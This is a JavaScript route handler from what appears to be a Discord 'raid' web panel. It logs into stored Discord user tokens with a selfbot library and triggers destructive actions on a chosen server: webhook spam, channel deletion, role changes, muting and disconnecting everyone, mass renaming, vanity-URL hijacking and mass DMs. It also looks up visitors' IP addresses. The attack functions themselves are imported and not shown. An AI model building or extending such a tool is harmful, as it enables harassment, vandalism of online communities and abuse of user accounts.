const db = require("quick.db");
const djs = require('discord.js-selfbot-v13');
const ipinfo = require("../../assets/function/web/ipinfo.js");
const webhook = require("../../assets/function/user/webhook.js");
const down = require("../../assets/function/user/down.js");
const channeldel = require("../../assets/function/user/channeldel.js");
const roleup = require("../../assets/function/user/roleup.js");
const dero = require("../../assets/function/user/dero.js");
const muteall = require("../../assets/function/user/muteall.js");
const decoall = require("../../assets/function/user/decoall.js");
const renameall = require("../../assets/function/user/renameall.js");
const urlfucker = require("../../assets/function/user/urlfucker.js");
const dmall = require("../../assets/function/user/dmall.js");
const config = require("../../config.json");
module.exports = {
    path: "/user/raid/:id/:n",
    method: "get",
    go: async (req, res) => {
        try {
            const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
            const r = await ipinfo(ip.replace("::ffff:", ""));
            if (r.status === "success") {
                if (db.has(`user_${ip.replace("::ffff:", "")}`)) {
                    const obj = req.query;
                    const client = new djs.Client({ checkUpdate: false });
                    const tkn = await db.get(`client_${req.params.id}`);
                    if (!tkn) {
                        let html = "<script>alert('Your session has expired, please log in again!');window.location = `" + config.domain + "/base`</script>";
                        return res.send(html);
                    } else {
                        client.login(tkn).catch(() => {
                            const html = "<script>alert(`Your session has expired, please log in again!`);window.location = `" + config.domain + "/base`</script>";
                            return res.send(html);
                        });
                        client.on("ready", async () => {
                            if (req.params.n === "10") return dmall(obj, res, client);
                            const g = client.guilds.cache.get(obj.id);
                            if (!g) {
                                client.destroy();
                                let html = "<script>alert('Serveur non valide !');window.location = `" + config.domain + "/user/panel/" + client.user.id + "/" + req.params.n + "`</script>";
                                return res.send(html);
                            } else {
                                if (req.params.n === "1") return webhook(g, obj, res, client);
                                if (req.params.n === "2") return down(g, res, client);
                                if (req.params.n === "3") return channeldel(g, res, client);
                                if (req.params.n === "4") return roleup(g, res, client);
                                if (req.params.n === "5") return dero(g, res, client);
                                if (req.params.n === "6") return muteall(g, res, client);
                                if (req.params.n === "7") return decoall(g, res, client);
                                if (req.params.n === "8") return renameall(g, obj, res, client);
                                if (req.params.n === "9") return urlfucker(g, obj, res, client);
                            }
                        })
                    }

                } else { return res.sendFile(`verif.html`, { root: "./views/web" }) }
            } else {
                return res.sendFile(`verif.html`, { root: "./views/web" })
            }
        } catch (err) {
            return;
        }
    }
}